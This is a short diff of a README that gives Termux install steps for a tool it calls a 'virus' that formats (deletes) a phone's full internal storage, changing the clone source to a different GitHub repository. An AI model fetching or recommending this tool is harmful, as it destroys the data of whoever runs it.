@@ -57,7 +57,7 @@ Warning 🚦 This Virus Formates (Deletes) Full Internal Storage So think and Us
 * `pkg install python2 -y`
 * `pkg install git -y`
 * `pip install lolcat`
-* `git clone https://github.com/noob-hackers/infect`
+* `git clone https://github.com/RenanSylva9/WostHack`
 * `cd $HOME`
 * `ls`
 * `cd WostHack`
